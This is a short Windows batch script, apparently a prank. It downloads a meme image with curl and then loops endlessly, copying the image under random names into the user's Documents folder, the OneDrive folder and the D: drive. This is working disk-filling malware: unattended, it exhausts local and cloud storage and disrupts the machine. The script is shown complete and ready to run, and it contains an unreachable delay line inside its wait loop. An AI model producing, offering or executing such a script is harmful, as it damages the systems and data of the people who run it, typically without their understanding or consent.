

curl https://i.kym-cdn.com/entries/icons/facebook/000/038/173/ggccover.jpg --output %USERPROFILE%\Documents\gwa.jpg --ssl-no-revoke


:checkForGwa
IF EXIST %USERPROFILE%\Documents\gwa.jpg GOTO gwaExist

GOTO checkForGwa
TIMEOUT /T 1 >nul
:gwaExist

:start
copy %USERPROFILE%\Documents\gwa.jpg %USERPROFILE%\Documents\%RANDOM%GwaGwaGwaGwaGwa%RANDOM%.jpg

copy %USERPROFILE%\Documents\gwa.jpg %OneDrive%\%RANDOM%GwaGwaGwaGwaGwa%RANDOM%.jpg

copy %USERPROFILE%\Documents\gwa.jpg D:\%RANDOM%GwaGwaGwaGwaGwa%RANDOM%.jpg

goto start

pause
